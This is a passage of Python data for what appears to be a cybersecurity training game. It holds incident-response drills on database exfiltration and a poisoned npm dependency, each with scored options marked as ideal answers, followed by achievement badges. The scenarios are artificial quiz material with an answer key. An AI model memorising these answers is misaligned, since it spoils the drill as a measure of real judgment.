        "code": "EXFIL_03",
        "title": "Silent Exfil: Stealth Database Data Leak via Encrypted Tunnel",
        "difficulty": "Hard",
        "threat_actor": "Financially Motivated Insider / Extortionist",
        "initial_briefing": "At 03:22 AM, network anomaly detection detects a sustained 48 Mbps outbound HTTPS session on port 8443 from internal database server `db-prod-02` to an unclassified cloud VPS. Over 18 GB of encrypted data has left the perimeter in the last 40 minutes.",
        "stages_json": json.dumps([
            {
                "stage_idx": 0,
                "stage_title": "Stage 1: Perimeter Interruption & Flow Analysis",
                "situation": "Data is streaming out continuously. The server hosts HIPAA and customer credit card tables. What is your immediate containment choice?",
                "options": [
                    {
                        "id": "A",
                        "text": "Apply an immediate perimeter firewall drop rule for the destination IP/port and sever the active TCP socket on `db-prod-02`.",
                        "security_impact": 100,
                        "data_loss_penalty": 0,
                        "consequence": "Decisive action! Instantly stops exfiltration in progress while keeping the database operational for internal emergency investigation.",
                        "is_ideal": True
                    },
                    {
                        "id": "B",
                        "text": "Pull the power cord from `db-prod-02` immediately.",
                        "security_impact": 40,
                        "data_loss_penalty": 50,
                        "consequence": "Abrupt power cut corrupts running database transactions and wipes out volatile RAM connection tables needed to identify the internal compromised process.",
                        "is_ideal": False
                    }
                ]
            },
            {
                "stage_idx": 1,
                "stage_title": "Stage 2: Process & Query Audit",
                "situation": "Firewall drop applied. Process inspection on `db-prod-02` shows an automated Python script `sync_temp.py` running under an orphaned service account `svc-analytics` using `pg_dump`. How do you remediate?",
                "options": [
                    {
                        "id": "A",
                        "text": "Revoke `svc-analytics` database privileges, rotate all database service keys, kill the process, and enforce strict egress firewall filtering (zero outbound internet access for database tiers).",
                        "security_impact": 100,
                        "data_loss_penalty": 0,
                        "consequence": "Textbook zero-trust architecture! Database tiers should never have direct outbound internet access. Enforcing strict egress blocks prevents any future exfiltration.",
                        "is_ideal": True
                    },
                    {
                        "id": "B",
                        "text": "Rename the Python script and allow the service account to continue running.",
                        "security_impact": 10,
                        "data_loss_penalty": 80,
                        "consequence": "Superficial change that leaves compromised administrative credentials active in production.",
                        "is_ideal": False
                    }
                ]
            }
        ])
    },
    {
        "code": "SUPPLY_04",
        "title": "Supply Chain Poisoning: Malicious CI/CD Dependency",
        "difficulty": "Hard",
        "threat_actor": "UNC2452 / SolarWinds Class Threat Group",
        "initial_briefing": "Automated security scanning in your GitLab CI/CD runner flags an unverified dependency update to popular npm utility `event-stream-helper` (v4.1.2). Static code analysis alerts that postinstall scripts attempt to dump developer AWS session credentials from environment variables to an external webhook.",
        "stages_json": json.dumps([
            {
                "stage_idx": 0,
                "stage_title": "Stage 1: Pipeline Quarantine & Blast Radius Audit",
                "situation": "The automated build pipeline runs 20 times daily. Has the compromised package been compiled into production releases?",
                "options": [
                    {
                        "id": "A",
                        "text": "Freeze deployment pipelines immediately, pin dependencies to verified immutable commit hashes, and revoke all CI/CD runner AWS IAM keys.",
                        "security_impact": 100,
                        "data_loss_penalty": 0,
                        "consequence": "Excellent response! Freezing deployment stops tainted code from reaching production, and rotating IAM keys neutralizes any credentials stolen by the malicious postinstall hook.",
                        "is_ideal": True
                    },
                    {
                        "id": "B",
                        "text": "Ignore the scanner warning as a probable false positive and proceed with the production release.",
                        "security_impact": 0,
                        "data_loss_penalty": 100,
                        "consequence": "Catastrophic! Pushing compromised code to production distributes malware directly to customers, leading to massive liability and reputation ruin.",
                        "is_ideal": False
                    }
                ]
            }
        ])
    }
]

SYSTEM_BADGES = [
    {
        "code": "FIRST_DRILL",
        "name": "First Step",
        "desc": "Completed your very first diagnostic cybersecurity drill.",
        "icon": "🎯",
        "category": "DRILL"
    },
    {
        "code": "SHARP_EYE",
        "name": "Eagle Eye",
        "desc": "Achieved 100% decision accuracy across at least 5 completed simulation drills.",
        "icon": "🦅",
        "category": "ACCURACY"
    },
    {
        "code": "PHISH_BUSTER",
        "name": "Phish Buster",
        "desc": "Successfully analyzed and identified 3 realistic phishing attacks in the Phishing Lab.",
        "icon": "🎣",
        "category": "PHISHING"
    },
    {
        "code": "CTF_ROOKIE",
        "name": "Flag Captor",
        "desc": "Captured your first Capture The Flag mission flag.",
        "icon": "🚩",
        "category": "CTF"
    },
    {
        "code": "CTF_MASTER",
        "name": "Master Cryptanalyst",
        "desc": "Solved 5 or more CTF challenges across log analysis and cryptography.",
        "icon": "🧩",
        "category": "CTF"
    },
    {
        "code": "INCIDENT_COMMANDER",
        "name": "Incident Commander",
        "desc": "Successfully completed a War Room incident response exercise with top marks.",
        "icon": "🚨",
        "category": "IR"
    },
    {
        "code": "STREAK_WARRIOR",
        "name": "Daily Sentinel",
        "desc": "Maintained a consecutive 3-day cybersecurity training streak.",
        "icon": "🔥",
        "category": "STREAK"
    },
    {
        "code": "CENTURION",
        "name": "Cyber Centurion",
        "desc": "Accumulated over 1,000 XP through drills, simulations, and CTF challenges.",
        "icon": "🛡️",
        "category": "XP"
    }
]

